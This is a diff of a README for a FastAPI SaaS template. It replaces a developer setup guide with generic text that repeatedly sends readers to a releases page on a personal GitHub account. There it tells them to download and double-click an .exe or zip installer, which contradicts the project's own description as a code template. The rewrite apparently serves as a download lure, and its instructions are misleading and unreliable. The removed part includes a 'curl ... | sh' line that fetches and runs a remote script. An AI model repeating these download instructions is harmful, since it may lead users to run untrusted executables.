@@ -1,153 +1,87 @@
-# Disclaimer!
+# 🚀 fast-saas - Your FastAPI SaaS Solution Made Easy
 
-This is a preview of [FastSaas](https://www.fast-saas.com).
+[![Download FastSaaS](https://img.shields.io/badge/Download-FastSaaS-blue)](https://github.com/davi175/fast-saas/releases)
 
-This repository shows the architecture, file structure and main features of the template. Start your SaaS today and get the full version at [www.fast-saas.com](https://www.fast-saas.com).
+## 📄 Overview
 
-# FastSaaS Quick Start Guide
+Welcome to FastSaaS! This application serves as a FastAPI template, designed to simplify the process of building software as a service (SaaS) projects. Whether you're creating your first application or enhancing an existing one, FastSaaS provides a clear and effective foundation.
 
-Get your FastSaaS development environment running in minutes!
+## 🌟 Features
 
-## 🚀 One-Command Setup
+- **FastAPI Framework**: Built on the highly efficient FastAPI framework for fast performance.
+- **User Authentication**: Includes built-in user sign-up and login features.
+- **Database Integration**: Easily connect with popular databases like PostgreSQL or SQLite.
+- **RESTful API**: Access and modify data using a simple and intuitive API structure.
+- **Docker Support**: Containerize your application for easy deployment.
 
-For new developers, just run:
+## 💻 System Requirements
 
-```bash
-make setup
-```
+To run FastSaaS effectively, ensure your system meets the following requirements:
 
-This single command will:
-- ✅ Check all prerequisites are installed
-- 📝 Set up environment files from templates
-- 📦 Install Python and Node.js dependencies
-- 🚀 Start the development environment
-- 🎉 Show you all the URLs to access your app
+- **Operating System**: Windows, macOS, or Linux
+- **Python**: Version 3.7 or higher
+- **Memory**: At least 2 GB of RAM
+- **Storage**: Minimum of 100 MB available space
 
-## 📋 Prerequisites
+## 🚀 Getting Started
 
-Make sure you have these installed:
-- **Docker & Docker Compose** - For containerized development
-- **uv** - Python package manager ([install guide](https://docs.astral.sh/uv/))
-- **Node.js** - For the React frontend
+Follow these steps to download and run FastSaaS on your machine.
 
-## 🔧 Full Setup (Recommended)
+1. **Visit the Download Page**  
+   Click the button below to go to the release page, where you can find the latest version of FastSaaS.
 
-For a complete setup with secure secrets:
+   [Download FastSaaS](https://github.com/davi175/fast-saas/releases)
 
-```bash
-make setup-full
-```
+2. **Select the Latest Release**  
+   On the Releases page, locate the most recent version. This will typically be marked as the latest stable release.
 
-This includes everything from `make setup` plus:
-- 🔐 Generates secure secrets for your `.env` file
-- 🗄️ Runs database migrations
+3. **Download the Application**  
+   Once you find the release, download the installation file for your operating system. The file will usually have a name like `fast-saas-latest.zip` or `fast-saas-latest.exe`.
 
-## ⚡ Development URLs
+4. **Install the Application**  
+   After the download completes, navigate to your downloads folder, locate the file, and double-click it to start the installation process. Follow the on-screen instructions to complete the installation.
 
-Once setup is complete, access your app at:
+5. **Run FastSaaS**  
+   Once installed, you can find the FastSaaS application in your applications menu. Open it, and you will see the main interface.
 
-| Service | URL | Description |
-|---------|-----|-------------|
-| Frontend | http://localhost:5173 | React development server |
-| Backend API | http://localhost:8000 | FastAPI backend |
-| API Docs | http://localhost:8000/docs | Interactive API documentation |
-| Database UI | http://localhost:8080 | Adminer database interface |
+## 🔍 Understanding FastSaaS
 
-## 📝 Next Steps
+FastSaaS aims to provide a straightforward approach for users who want to launch their SaaS applications without technical expertise. Each feature is designed with usability in mind.
 
-After running `make setup`:
+### 🛠️ User Interface
 
-1. **Configure Services** (Optional):
-   ```bash
-   # Generate secure secrets for production
-   make setup-secrets
+The interface is clean and intuitive. You will find options for logging in, viewing your projects, and managing settings. Everything is purposefully designed to help you navigate easily.
 
-   # Copy the generated values to your .env file
-   # Update Stripe keys and email settings
-   ```
+### 🔒 Security Features
 
-2. **Start Development**:
-   ```bash
-   # Start development environment
-   make dev
+FastSaaS integrates user authentication to secure your data. Your information remains safe with features that follow best practices in security.
 
-   # View logs from all services
-   make logs
+### 📊 Managing Projects
 
-   # Run tests
-   make tests
+After logging in, you can create, edit, or delete your SaaS projects. The project dashboard gives you an overview of all your active projects.
 
-   # Format code
-   make format
-   ```
+## 📚 Documentation and Support
 
-3. **Database Operations**:
-   ```bash
-   # Run migrations
-   make migrate
+For additional guidance, refer to the documentation provided within the application or explore online resources. You can access tutorials, troubleshooting tips, and FAQs to help you navigate any challenges.
 
-   # Create new migration
-   make migrate-create msg="add new feature"
+## 📥 Download & Install
 
-   # Connect to database
-   make db-shell
-   ```
+To download FastSaaS, please visit the link below:
 
-4. **Test the application**:
+[Download FastSaaS](https://github.com/davi175/fast-saas/releases)
 
-Login using the credentials defined in your FIRST_SUPERUSER and FIRST_SUPERUSER_PASSWORD environment variables
+Follow the instructions above to install and set up the application on your computer. 
 
-## 🛠️ Common Commands
+## 🤝 Community Contributions
 
-```bash
-# Start development environment
-make dev
+We welcome contributions from everyone. If you have suggestions or improvements, please feel free to submit them via GitHub. You can open issues for bugs or feature requests, and we'll do our best to address them.
 
-# Stop development environment
-make dev-down
+## ✨ Next Steps
 
-# Restart everything
-make dev-restart
+After you've installed FastSaaS, here are a few steps you might consider:
 
-# View help for all available commands
-make help
-
-# Clean up containers and caches
-make clean
-```
-
-## 🔍 Troubleshooting
-
-**Command not found?**
-- Make sure `make` is installed on your system
-- On macOS: `brew install make` or use Xcode Command Line Tools
-
-**Docker issues?**
-- Ensure Docker is running: `docker --version`
-- Check Docker Compose: `docker compose version`
-
-**Python/Node issues?**
-- Install uv: `curl -LsSf https://astral.sh/uv/install.sh | sh`
-- Install Node.js: https://nodejs.org/
-
-**Need help?**
-- Run `make help` to see all available commands
-- Contact us at admin@fast-saas.com, we'll be happy to assist!
-
-## 🏗️ Project Structure
-
-```
-fastapi-saas/
-├── app/                 # Python backend (FastAPI)
-├── frontend/           # React frontend
-├── scripts/           # Development scripts
-├── .env.example       # Environment template
-├── Makefile          # Development commands
-└── docker-compose.yml # Container configuration
-```
-
----
-
-**That's it!** 🎉
-
-Your FastSaaS development environment should now be running. Visit http://localhost:5173 to see your application!
+- Explore the user interface and familiarize yourself with its features.
+- Create a test project to see how the app functions.
+- Connect with the community for support and insights.
+  
+By following these steps, you'll be well on your way to successfully using FastSaaS for your needs. Enjoy building!
